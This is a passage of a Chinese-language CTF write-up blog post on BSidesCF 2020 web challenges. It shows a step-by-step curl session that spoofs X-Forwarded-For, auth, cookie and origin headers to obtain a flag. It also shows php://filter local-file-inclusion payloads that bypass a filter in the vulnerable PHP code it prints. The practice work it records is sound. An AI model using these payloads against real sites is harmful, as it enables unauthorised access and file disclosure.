class="keyword">if</span> resp[<span class="string">&#x27;Balance&#x27;</span>] &gt; <span class="number">100000</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h1><p>考察<code>curl</code>的使用吧</p>
+<ul>
+<li><code>%2500</code>进行URL解码之后就是<code>%00</code>。</li>
+<li>curl工具使用<code>-u</code>参数进行基本验证。</li>
+<li>curl工具中使用<code>-A</code>参数指定浏览器。</li>
+<li>curl工具中使用<code>-H</code>参数增加请求头。</li>
+<li>curl工具中使用<code>-b</code>参数添加Cookie。</li>
+<li>请求头中，<code>Origin</code>指明当前请求来自于哪个站点。</li>
+<li>curl工具中使用<code>-i</code>参数显示响应头信息。</li>
+</ul>
+<p>挨着打就行了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT http://node5.buuoj.cn:25762/hurdles</span><br><span class="line">I&#x27;m sorry, Your path would be more exciting if it ended in !</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT http://node5.buuoj.cn:25762/hurdles/!</span><br><span class="line">I&#x27;m sorry, Your URL did not ask to `get` the `flag` in its query string.</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:25762/hurdles/!?get=flag&#x27;</span><br><span class="line">I&#x27;m sorry, I was looking for a parameter named &amp;=&amp;=&amp;</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:25762/hurdles/!?get=flag&amp;%26%3D%26%3D%26=1&#x27;</span><br><span class="line">I&#x27;m sorry, I expected &#x27;&amp;=&amp;=&amp;&#x27; to equal &#x27;%00</span><br><span class="line">&#x27;</span><br><span class="line">这里他想要一个%00也就是换行,但是如果要生效的话必须还得是后面再来个换行</span><br><span class="line">curl -X PUT &#x27;http://node5.buuoj.cn:25762/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27;</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:25762/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27;</span><br><span class="line">I&#x27;m sorry, Basically, I was expecting the username player.</span><br><span class="line">由于不知道值是多少只能这么传</span><br><span class="line">curl -X PUT &#x27;http://node5.buuoj.cn:25762/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:player&#x27;</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:player&#x27;</span><br><span class="line">I&#x27;m sorry, Basically, I was expecting the password of the hex representation of the md5 of the string &#x27;open sesame&#x27;</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27;</span><br><span class="line">I&#x27;m sorry, I was expecting you to be using a 1337 Browser.</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser&#x27;</span><br><span class="line">I&#x27;m sorry, I was expecting your browser version (v.XXXX) to be over 9000!</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27;</span><br><span class="line">I&#x27;m sorry, I was eXpecting this to be Forwarded-For someone!</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27; -H &#x27;X-Forwarded-For:192.168.128.130,127.0.0.1&#x27;</span><br><span class="line">I&#x27;m sorry, I was expecting the forwarding client to be 13.37.13.37</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27; -H &#x27;X-Forwarded-For:192.168.128.130,13.37.13.37&#x27;</span><br><span class="line">I&#x27;m sorry, I was expecting this to be forwarded through 127.0.0.1</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27; -H &#x27;X-Forwarded-For:13.37.13.37,127.0.0.1&#x27;</span><br><span class="line">I&#x27;m sorry, I was expecting a Fortune Cookie</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27; -H &#x27;X-Forwarded-For:13.37.13.37,127.0.0.1&#x27; -b &#x27;Fortune=1&#x27;</span><br><span class="line">I&#x27;m sorry, I was expecting the cookie to contain the number of the HTTP Cookie (State Management Mechanism) RFC from 2011.</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27; -H &#x27;X-Forwarded-For:13.37.13.37,127.0.0.1&#x27; -b &#x27;Fortune=6265&#x27;</span><br><span class="line">I&#x27;m sorry, I expect you to accept only plain text media (MIME) type.</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27; -H &#x27;X-Forwarded-For:13.37.13.37,127.0.0.1&#x27; -b &#x27;Fortune=6265&#x27; -H &#x27;Accept:text/plain&#x27;</span><br><span class="line">I&#x27;m sorry, Я ожидал, что вы говорите по-русски.</span><br><span class="line">说俄语</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27; -H &#x27;X-Forwarded-For:13.37.13.37,127.0.0.1&#x27; -b &#x27;Fortune=6265&#x27; -H &#x27;Accept:text/plain&#x27; -H &#x27;Accept-Language:ru&#x27;</span><br><span class="line">I&#x27;m sorry, I was expecting to share resources with the origin https://ctf.bsidessf.net</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27; -H &#x27;X-Forwarded-For:13.37.13.37,127.0.0.1&#x27; -b &#x27;Fortune=6265&#x27; -H &#x27;Accept:text/plain&#x27; -H &#x27;Accept-Language:ru&#x27; -H &#x27;origin:https://ctf.bsidessf.net&#x27;</span><br><span class="line">I&#x27;m sorry, I was expecting you would be refered by https://ctf.bsidessf.net/challenges?</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27; -H &#x27;X-Forwarded-For:13.37.13.37,127.0.0.1&#x27; -b &#x27;Fortune=6265&#x27; -H &#x27;Accept:text/plain&#x27; -H &#x27;Accept-Language:ru&#x27; -H &#x27;origin:https://ctf.bsidessf.net/challenges&#x27;</span><br><span class="line">I&#x27;m sorry, I was expecting to share resources with the origin https://ctf.bsidessf.net</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27; -H &#x27;X-Forwarded-For:13.37.13.37,127.0.0.1&#x27; -b &#x27;Fortune=6265&#x27; -H &#x27;Accept:text/plain&#x27; -H &#x27;Accept-Language:ru&#x27; -H &#x27;origin:https://ctf.bsidessf.net&#x27; -H &#x27;Referer:https://ctf.bsidessf.net/challenges&#x27;</span><br><span class="line">Congratulations!</span><br><span class="line">但是没有得到flag,估计在返回头里面</span><br><span class="line"></span><br><span class="line">root@dkcjbRCL8kgaNGz:~# curl -i -X PUT &#x27;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#x27; -u &#x27;player:54ef36ec71201fdf9d1423fd26f97f6b&#x27; -A &#x27;1337 Browser v.9001&#x27; -H &#x27;X-Forwarded-For:13.37.13.37,127.0.0.1&#x27; -b &#x27;Fortune=6265&#x27; -H &#x27;Accept:text/plain&#x27; -H &#x27;Accept-Language:ru&#x27; -H &#x27;origin:https://ctf.bsidessf.net&#x27; -H &#x27;Referer:https://ctf.bsidessf.net/challenges&#x27;</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Ctf-Flag: flag&#123;552ea2bc-52e9-4083-8fc0-66d6439b377b&#125;</span><br><span class="line">Date: Wed, 21 Aug 2024 14:26:45 GMT</span><br><span class="line">Content-Length: 16</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br></pre></td></tr></table></figure>
+
+<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>很简单一个题，直接秒了</p>
+<p>观察<code>url</code>发现可以文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">						<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>嵌套一下就绕过了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=php://filter/convert.base64-encode/index/resource=flag</span><br><span class="line"></span><br><span class="line">/index.php?category=php://filter/index/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>
+
+<p>就拿到了，测试一下不能带<code>php</code>也是很容易就测出来的，所以<code>index.php</code>也很容易拿到</p>
+
+  </div>
+
+  <!-- 赞赏按钮和二维码 -->
+  <div class="donation-container">
+    <button id="donate-btn" class="donate-btn">reward</button>
+    <div id="donation-qr" class="donation-qr" style="display: none;">
+      <img src="/images/award.png" alt="扫码打赏" />
+    </div>
+  </div>
+  <!-- 赞赏按钮和二维码的结束 -->
+
+</article>
+
+
+
+
+    <div class="blog-post-comments">
+        <div id="waline_thread"></div>
+    </div>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">Aβout</a></li>
+        
+          <li><a href="/tags/">Topi3s</a></li>
+        
+          <li><a href="/categories/">Cat4gory</a></li>
+        
+          <li><a href="/links/">Li^ks</a></li>
+        
+          <li><a href="/search/">Seαrch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Bulls23"><span class="toc-number">1.</span> <span class="toc-text">[BSidesCF 2020]Bulls23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Cards"><span class="toc-number">2.</span> <span class="toc-text">[BSidesCF 2020]Cards</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Hurdles"><span class="toc-number">3.</span> <span class="toc-text">[BSidesCF 2020]Hurdles</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="toc-number">4.</span> <span class="toc-text">[BSidesCF 2020]Had a bad day</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://baozongwi.xyz/posts/9c78d50f.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://baozongwi.xyz/posts/9c78d50f.html&text=bsidescf2020"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://baozongwi.xyz/posts/9c78d50f.html&title=bsidescf2020"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://baozongwi.xyz/posts/9c78d50f.html&is_video=false&description=bsidescf2020"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=bsidescf2020&body=Check out this article: https://baozongwi.xyz/posts/9c78d50f.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://baozongwi.xyz/posts/9c78d50f.html&title=bsidescf2020"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://baozongwi.xyz/posts/9c78d50f.html&title=bsidescf2020"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://baozongwi.xyz/posts/9c78d50f.html&title=bsidescf2020"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://baozongwi.xyz/posts/9c78d50f.html&title=bsidescf2020"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://baozongwi.xyz/posts/9c78d50f.html&name=bsidescf2020&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://baozongwi.xyz/posts/9c78d50f.html&t=bsidescf2020"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        baozongwi
+        <br>
+		<a href="https://www.dkdun.cn/" target="_blank">DK盾</a>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">Aβout</a></li><!--
+                --><!--
+                --><li><a href="/tags/">Topi3s</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Cat4gory</a></li><!--
+                --><!--
+                --><li><a href="/links/">Li^ks</a></li><!--
+                --><!--
+                --><li><a href="/search/">Seαrch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<!-- Waline Comments -->
+
+  <script type="module">
+    import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+
+    var EMOJI = ['//unpkg.com/@waline/emojis@1.2.0/weibo']
+    var META = ['nick', 'mail', 'link'];
+    var REQUIREDFIELDS = ['nick', 'mail', 'link'];
+
+    var emoji = '//unpkg.com/@waline/emojis@1.2.0/qq'.split(',').filter(function(item){
+      return item !== ''; // filter()返回满足不为空item
+    });
+    emoji = emoji.length == 0 ? EMOJI : emoji;
+
+    var meta = 'nick,mail'.split(',').filter(function(item){
+      return META.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
+    });
+    meta = meta.length == 0 ? META : meta;
+
+    var requiredFields = 'nick,mail'.split(',').filter(function(item){
+      return REQUIREDFIELDS.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
+    });
+    requiredFields = requiredFields.length == 0 ? REQUIREDFIELDS : requiredFields;
+
+    init({
+      el: '#waline_thread',
+      serverURL: 'https://waline.baozongwi.xyz/', // Waline 的服务端地址
+      path: '' == '' ? window.location.pathname : '', // 当前文章页路径，用于区分不同的文章页，以保证正确读取该文章页下的评论列表
+      lang: 'zh-CN' == '' ? 'zh-CN' : 'zh-CN', // 多语言支持，未设置默认英文
+      emoji: emoji,
+      dark: 'auto', // 暗黑模式适配
+      commentSorting: '' == '' ? 'latest' : '', // 评论列表排序方式
+      meta: meta, // 评论者相关属性
+      requiredFields: requiredFields, // 设置必填项，默认匿名
+      login: '', // 登录模式状态
+      wordLimit: '', // 评论字数限制
+      pageSize: '10' == '' ? 10 : '10', // 评论列表分页，每页条数
+      imageUploader: '', // 自定义图片上传方法
+      highlighter: '', // 代码高亮
+      locale: {
+          placeholder: 'ヾ(☆▽☆)ノ 等你来评论！', 
+          sofa: '這個評論區有點冷₍˄·͈༝·͈˄*₎◞ ̑̑', 
+        },
+      avatar: 'mp',
+      visitor: 'false',
+      comment_count: 'false',
+      review: true,
+    });
+  </script>
+
+</body>
+</html>
